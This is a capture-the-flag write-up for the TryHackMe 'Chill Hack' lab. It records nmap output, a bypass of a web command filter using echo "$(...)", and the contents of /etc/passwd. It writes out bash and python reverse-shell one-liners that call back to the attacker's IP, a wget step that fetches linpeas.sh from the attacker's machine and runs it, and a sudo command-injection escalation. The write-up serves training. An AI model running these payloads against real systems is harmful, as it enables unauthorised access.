# [Chill Hack](https://tryhackme.com/room/chillhack)

```
export IP=10.10.133.204
```

---

## Task 1
1. User flag

	a. Nmap scan (`nmap -sV -sC -oN nmap/initial $IP`):
	```
	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     vsftpd 3.0.3
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to ::ffff:10.6.53.245
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 4
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
	|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
	|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
	|_http-title: Game Info
	|_http-server-header: Apache/2.4.29 (Ubuntu)
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	```

	b. `http://$IP/secret/` gives us a way of remote code execution. Most commands are blacklisted (ex: `python3`, `which`, etc). However, I did find that I run any command as long as the command is contained within `echo "$(<command here>)"`.

	c. Was able to retrieve the contents of `/etc/passwd` (`echo "$(cat /etc/passwd)"`):
	```
	root:x:0:0:root:/root:/bin/bash 
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
	bin:x:2:2:bin:/bin:/usr/sbin/nologin 
	sys:x:3:3:sys:/dev:/usr/sbin/nologin 
	sync:x:4:65534:sync:/bin:/bin/sync 
	games:x:5:60:games:/usr/games:/usr/sbin/nologin 
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
	systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin 
	systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin 
	syslog:x:102:106::/home/syslog:/usr/sbin/nologin 
	messagebus:x:103:107::/nonexistent:/usr/sbin/nologin 
	_apt:x:104:65534::/nonexistent:/usr/sbin/nologin 
	lxd:x:105:65534::/var/lib/lxd/:/bin/false 
	uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin 
	dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 
	landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin 
	pollinate:x:109:1::/var/cache/pollinate:/bin/false 
	sshd:x:110:65534::/run/sshd:/usr/sbin/nologin 
	aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash 
	mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false 
	apaar:x:1001:1001:,,,:/home/apaar:/bin/bash 
	anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash 
	ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
	```

	d. Trying to create a reverse shell payload:
	```
	# On local machine:
	nc -lnvp 9999

	# Inside the http://$IP/secret/ command input:
	echo "$(bash -c 'exec bash -i &>/dev/tcp/10.6.53.245/9999 <&1')"

	# Bash reverse shell was blocked so trying python:
	echo "$(python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("10.6.53.245", 9999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")')"
	```

	e. That did the trick! Got my reverse shell.

	f. Don't have a lot of access being www-data so I downloaded linpeas.sh to the target machine and ran it.
	```
	# On local machine
	cd /usr/share/enumeration	# The place where I have linpeas.sh saved.

	# On target machine
	cd /dev/shm
	wget -O linpeas.sh http://$MY_IP:8000/linpeas.sh
	chmod 777 linpeas.sh
	./linpeas.sh | tee linpeas.log
	```

	g. Realized with `sudo -l` that we can run the /home/apaar/.helpline.sh script as any user and that the script itself is vulnerable to command injection.
	```
	sudo -u apaar /home/apaar/.helpline.sh

	# Then stabilize the shell again and now you're `apaar`.
	```

	h. Was able to find the User Flag @ `/home/apaar/local.txt`:
	```
	{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
	```


2. Root flag

	a. 